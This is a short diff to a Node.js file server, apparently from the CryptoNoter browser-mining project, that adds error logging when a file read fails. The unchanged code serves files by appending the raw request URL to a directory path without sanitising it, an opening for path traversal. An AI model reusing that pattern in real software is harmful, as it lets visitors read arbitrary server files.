@@ -54,7 +54,9 @@ const ssl = !!(conf.key && conf.cert);
 const stats = (req, res) => {
     req.url = (req.url === '/') ? '/index.html' : req.url;
     fs.readFile(__dirname + '/web' + req.url, (err, buf) => {
-        if (err) {} else {
+        if (err) {
+		console.error(err);
+	} else {
             if (!req.url.match(/\.wasm$/) && !req.url.match(/\.mem$/)) {
                 buf = buf.toString().replace(/%CryptoNoter_domain%/g, conf.domain);
                 if (req.url.match(/\.js$/)) {
